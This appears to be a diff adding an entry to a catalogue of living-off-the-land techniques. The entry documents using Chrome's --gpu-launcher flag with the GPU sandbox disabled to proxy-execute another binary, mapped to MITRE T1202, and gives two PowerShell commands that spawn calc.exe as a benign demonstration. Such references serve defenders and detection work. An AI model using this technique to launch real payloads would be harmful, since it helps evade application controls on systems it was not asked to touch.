@@ -1,0 +1,12 @@
+Usecase: Proxy execution of binary
+Privileges required: User
+OS: Windows 10, Windows 11
+MITRE ATT&CK®: T1202: Indirect Command Execution
+
+
+
+This command launches the chrome/chrome_proxy.exe browser control without sandboxing and will spawn calc.exe as its subprocess.
+
+& 'C:\Program Files\Google\Chrome\Application\chrome.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
+
+& 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
